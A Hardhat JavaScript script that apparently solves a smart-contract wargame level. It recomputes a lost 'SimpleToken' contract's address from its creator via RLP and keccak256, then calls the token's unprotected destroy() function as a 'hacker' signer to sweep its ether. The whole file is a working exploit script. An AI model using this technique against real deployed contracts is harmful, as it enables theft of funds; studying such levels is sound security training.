// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const { ethers, utils } = require("ethers");
const hre = require("hardhat");
const { consoleLogMessage } = require("../utils/utils");

async function main() {
  // 📖 https://ethereum.github.io/yellowpaper/paper.pdf - search for "RLP"
  // 👉 Instance address - Contract that creates the simple token
  const contractLevelCreator = "0xBE3017d3729878cc722af909b15e4725622D7850";
  let deterministicAddress = ethers.utils.RLP.encode([
    contractLevelCreator,
    "0x01",
  ]);
  deterministicAddress = utils.keccak256(deterministicAddress);
  deterministicAddress =
    "0x" +
    deterministicAddress.substring(
      deterministicAddress.length - 20 * 2,
      deterministicAddress.length
    );
  consoleLogMessage(
    `📘 Contract address found deterministically: \n${deterministicAddress}`
  );

  // 👉 Contract name and address
  const contractName = "SimpleToken";
  let contractAddress = "_____________________________";
  contractAddress = deterministicAddress; // 👈 You could uncomment, same result

  // 📗 We get the contract to be hacked
  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // 🔨 Get accounts
  let [hacker, _, tester] = await hre.ethers.getSigners();
  hacker = tester;
  consoleLogMessage(`🤓 Hacker address:\n ${hacker.address} \n`);

  // 🔊 Logging contracts addresses
  consoleLogMessage(`📗 ${contractName}.sol address: \n${contract.address}\n`);

  // 🔊 Logging
  let balanceInEth = await hacker.provider.getBalance(contract.address);
  balanceInEth = ethers.utils.formatEther(balanceInEth);
  consoleLogMessage(
    `💰 ${contractName}.sol balance: \n${balanceInEth} ether\n`
  );
  consoleLogMessage("\n\n");

  // 👿 Hacking
  consoleLogMessage("👿 Hacking ...");
  consoleLogMessage(`Contract name: ${await contract.connect(hacker).name()}`);
  tx = await contract.connect(hacker).destroy(hacker.address);
  await tx.wait(1);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
